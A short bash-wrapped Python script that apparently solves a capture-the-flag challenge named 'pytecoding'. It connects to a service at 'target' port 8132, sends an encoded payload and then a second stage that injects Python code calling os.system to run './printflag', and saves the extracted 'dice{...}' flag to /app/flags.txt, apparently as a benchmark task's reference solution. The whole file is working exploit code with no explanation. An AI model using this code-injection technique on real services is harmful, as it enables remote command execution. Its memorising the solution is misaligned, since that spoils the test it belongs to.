#!/usr/bin/env bash
set -euo pipefail

python3 - <<'PY'
from __future__ import annotations

import pathlib
import re
import socket

payload = "3b073b073b01760933091f01760433031f0133000c0132027502760833071f017502760933091f01760933091f01760433031f013b053b043301180176013b057502620975072301"
second_stage = 'p __import__("os").system("./printflag")'

with socket.create_connection(("target", 8132), timeout=30) as sock:
    sock.settimeout(30)
    sock.recv(4096)
    sock.sendall(payload.encode() + b"\n")
    sock.sendall(second_stage.encode() + b"\n")
    chunks = []
    while True:
        try:
            data = sock.recv(4096)
        except TimeoutError:
            break
        if not data:
            break
        chunks.append(data)

output = b"".join(chunks).decode("utf-8", errors="replace")
match = re.search(r"dice\{[^}\r\n]+\}", output)
if not match:
    raise SystemExit(f"flag not found in pytecoding output: {output!r}")
pathlib.Path("/app/flags.txt").write_text(match.group(0) + "\n")
print(match.group(0))
PY
